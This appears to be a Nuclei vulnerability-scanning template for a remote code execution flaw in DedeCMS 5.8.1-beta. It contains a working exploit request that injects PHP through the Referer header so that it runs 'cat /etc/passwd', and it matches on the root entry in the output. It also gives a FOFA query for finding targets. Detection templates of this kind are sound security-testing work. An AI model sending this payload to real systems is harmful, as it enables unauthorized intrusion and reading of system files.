id: dedecms-rce
info:
  name: DedeCMS 5.8.1-beta - Remote Code Execution
  author: ritikchaddha
  severity: critical
  description: DedeCMS 5.8.1-beta allows remote code execution through a variable
    override vulnerability, which can lead to unauthorized access, data manipulation,
    and complete control of the compromised system.
  reference:
  - https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html
  - https://sectime.top/post/1d114771.html
  metadata:
    verified: true
    fofa-query: app="DedeCMS"
    impact: The DedeCMS 5.8.1-beta's vulnerability to remote code execution via a
      variable override can result in a significant impact, including unauthorized
      access to sensitive information, data modification, and complete control of
      the compromised system.
    recommendation: It is recommended to immediately update DedeCMS to the latest
      version to prevent exploitation of the remote code execution vulnerability.
  tags: dedecms,cms,rce
requests:
- raw:
  - 'GET /plus/flink.php?dopost=save&c=cat%20/etc/passwd HTTP/1.1

    Host: {{Hostname}}

    Referer: <?php "system"($c);die;/*ref

    '
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
